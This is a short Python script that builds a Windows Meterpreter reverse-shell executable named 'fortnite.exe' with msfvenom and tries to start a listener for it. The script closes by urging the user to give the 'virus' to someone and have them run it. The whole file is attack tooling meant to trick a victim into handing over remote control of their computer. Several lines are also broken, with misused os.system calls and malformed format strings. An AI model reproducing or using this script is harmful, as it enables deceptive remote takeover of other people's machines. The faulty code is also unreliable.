import os
LHOST = raw_input("input your ip adress:")
LPORT = raw_input("input your port:")
os.system("msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=%s LPORT=%s -o /root/Desktop/fortnite.exe" % (LHOST, LPORT))
os.system("msfconsole")
os.system("use multi/handler")
os.system("set payload windows/meterpreter/reverse_tcp")
os.system("set LHOST" % LHOST))
os.system("set LPORT" % LPORT))
print ("Now go give the virus in your desktop folder to someone have them run it!")
